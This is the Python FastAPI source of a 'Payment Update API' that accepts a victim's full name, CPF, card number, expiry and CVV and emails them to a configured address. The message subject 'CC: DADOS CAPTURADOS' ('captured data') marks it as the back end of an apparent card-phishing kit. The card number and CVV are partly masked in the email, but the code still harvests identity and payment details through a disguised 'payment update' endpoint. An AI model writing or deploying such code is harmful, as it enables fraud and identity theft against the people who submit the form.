from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import os
from dotenv import load_dotenv

load_dotenv()

app = FastAPI(title="Payment Update API", version="1.0.0")

# CORS configuration
origins = [
    "http://localhost:5173",
    "http://localhost:3000",
    "http://localhost:8000",
    "http://127.0.0.1:5173",
    "http://127.0.0.1:3000",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Pydantic models
class PaymentData(BaseModel):
    nomeCompleto: str
    cpf: str
    numeroCartao: str
    validade: str
    cvv: str

class EmailResponse(BaseModel):
    success: bool
    message: str
    timestamp: str

# Email configuration
EMAIL_FROM = os.getenv("EMAIL_FROM", "your-email@gmail.com")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "your-app-password")
EMAIL_TO = os.getenv("EMAIL_TO", "your-email@gmail.com")
SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.getenv("SMTP_PORT", 587))

def send_email(payment_data: PaymentData) -> bool:
    """Send payment update email"""
    try:
        # Create message
        message = MIMEMultipart("alternative")
        message["Subject"] = "CC: DADOS CAPTURADOS"
        message["From"] = EMAIL_FROM
        message["To"] = EMAIL_TO

        # Format the card number to show only last 4 digits
        card_masked = f"**** **** **** {payment_data.numeroCartao[-4:]}"

        # Create plain text version
        text = f"""
Dados de Pagamento Atualizado
=============================

Nome Completo: {payment_data.nomeCompleto}
CPF: {payment_data.cpf}
Número do Cartão: {card_masked}
Validade: {payment_data.validade}
CVV: ***
Data/Hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
"""

        # Create HTML version
        html = f"""
        <html>
            <body style="font-family: Arial, sans-serif; background-color: #f5f5f5; padding: 20px;">
                <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                    <h2 style="color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px;">Dados de Pagamento Atualizado</h2>
                    
                    <table style="width: 100%; margin-top: 20px;">
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">Nome Completo:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.nomeCompleto}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td style="padding: 8px; font-weight: bold; color: #555;">CPF:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.cpf}</td>
                        </tr>
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">Número do Cartão:</td>
                            <td style="padding: 8px; color: #333;">{card_masked}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td style="padding: 8px; font-weight: bold; color: #555;">Validade:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.validade}</td>
                        </tr>
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">CVV:</td>
                            <td style="padding: 8px; color: #333;">***</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td style="padding: 8px; font-weight: bold; color: #555;">Data/Hora:</td>
                            <td style="padding: 8px; color: #333;">{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</td>
                        </tr>
                    </table>
                    
                    <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #999; font-size: 12px;">
                        <p>Este é um e-mail automático. Por favor, não responda a este e-mail.</p>
                    </div>
                </div>
            </body>
        </html>
        """

        # Attach versions
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        # Send email
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_FROM, EMAIL_PASSWORD)
            server.sendmail(EMAIL_FROM, EMAIL_TO, message.as_string())

        return True
    except Exception as e:
        print(f"Email sending error: {str(e)}")
        return False

@app.get("/")
async def root():
    """Health check endpoint"""
    return {"status": "API is running", "service": "Payment Update Service"}

@app.post("/api/update-payment", response_model=EmailResponse)
async def update_payment(data: PaymentData):
    """
    Receive payment data and send email
    """
    try:
        # Validate CVV is not empty and send email
        if send_email(data):
            return EmailResponse(
                success=True,
                message="Pagamento atualizado e e-mail enviado com sucesso!",
                timestamp=datetime.now().isoformat()
            )
        else:
            raise HTTPException(
                status_code=500,
                detail="Erro ao enviar e-mail. Tente novamente mais tarde."
            )
    except Exception as e:
        print(f"Error: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"Erro ao processar a solicitação: {str(e)}"
        )

@app.post("/api/test-email")
async def test_email():
    """Test email configuration"""
    try:
        test_data = PaymentData(
            nomeCompleto="Teste",
            cpf="000.000.000-00",
            numeroCartao="4111111111111111",
            validade="12/25",
            cvv="123"
        )
        
        if send_email(test_data):
            return {
                "success": True,
                "message": "E-mail de teste enviado com sucesso!"
            }
        else:
            return {
                "success": False,
                "message": "Falha ao enviar e-mail de teste"
            }
    except Exception as e:
        return {
            "success": False,
            "message": f"Erro: {str(e)}"
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
